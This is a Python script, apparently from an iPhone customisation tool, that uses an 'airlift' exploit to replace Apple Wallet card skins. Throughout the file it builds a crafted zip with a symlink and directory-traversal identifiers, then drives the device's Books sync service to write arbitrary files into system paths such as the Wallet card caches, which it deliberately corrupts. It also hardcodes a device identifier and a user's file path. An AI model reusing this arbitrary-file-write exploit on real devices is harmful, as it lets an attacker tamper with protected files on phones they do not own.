#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "bin" / "device_helper" if (ROOT / "bin" / "device_helper").is_file() else ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "bin" / "airtraffic_host" if (ROOT / "bin" / "airtraffic_host").is_file() else ROOT / "build" / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def write_file(udid: str, target: str, leaf: str, payload: bytes) -> bool:
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"

    link_identifier = f"../../{source}/p0/p1/p2/link"
    payload_identifier = f"../../{source}/payload"

    # Step 1: move link to media
    # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
    identifiers = [link_identifier, payload_identifier]
    destinations = [
        link_destination,
        posixpath.join(link_destination, leaf),
    ]

    with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        snapshot_root = work / "books-snapshot"
        snapshot_root.mkdir()

        archive_path.write_bytes(build_archive(target, payload))
        books_path.write_bytes(build_books(identifiers))

        snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
        if not operation_ok(snapshot):
            raise RuntimeError("could not snapshot Books state")

        stage = native(
            "stage",
            udid,
            source,
            link_destination,
            recovered,
            os.fspath(archive_path),
            os.fspath(books_path),
            os.fspath(snapshot_root),
        )
        if not operation_ok(stage):
            raise RuntimeError(f"staging failed: {stage}")

        atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
        for identifier, destination in zip(identifiers, destinations):
            atc_cmd.extend((identifier, destination))
        atc = run_json(atc_cmd, timeout=120)

        finish = native(
            "finish-write",
            udid,
            source,
            link_destination,
            recovered,
            os.fspath(snapshot_root),
        )

    ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
    return ok


def invalidate_cache(udid: str, card_hash: str) -> bool:
    """Invalidates card image cache by corrupting cache leaves in .cache and .pkcache."""
    any_ok = False
    for ext in [".cache", ".pkcache"]:
        cache_dir = f"/var/mobile/Library/Passes/Cards/{card_hash}{ext}"
        for leaf in ["FrontFace", "PlaceHolder", "Preview"]:
            try:
                if write_file(udid, cache_dir, leaf, b"corrupted"):
                    any_ok = True
            except Exception:
                pass
    return any_ok


def main():
    udid = "00008120-001A1D0A1EE9A01E"
    batter_path = Path("/Users/mak5er/Downloads/CardChanger.batter")
    if not batter_path.is_file():
        print(f"Error: {batter_path} not found")
        sys.exit(1)

    with zipfile.ZipFile(batter_path, "r") as z:
        img_data = z.read("CardChanger/container/RENAME_ME.pkpass/cardBackgroundCombined@2x.png")

    hashes = [
        "OM6NYhwXMZrAw0sRUjR62wmF4ZQ=",
        "M6nDwZrkYbFlsodLgCbvyFZQ1cc=",
        "kJL-D0rr-SZhbj2c8nK-OQ9hCMY=",
        "hwAtAmHKYwsQrJbT5cTNDsaxVME=",
    ]

    print(f"Loaded image from batter: {len(img_data)} bytes")
    print(f"Targeting {len(hashes)} cards on device {udid}...")

    # The legacy entry point uses the same mandatory backup gate as the GUI.
    from aircard_backend import cmd_flash
    with tempfile.TemporaryDirectory(prefix="aircard-legacy-") as directory:
        image = Path(directory) / "artwork.png"
        image.write_bytes(img_data)
        for h in hashes:
            if not cmd_flash(udid, h, str(image)):
                sys.exit(1)

    print("\nAll done! Please force close Wallet on your iPhone and reopen it.")


if __name__ == "__main__":
    main()
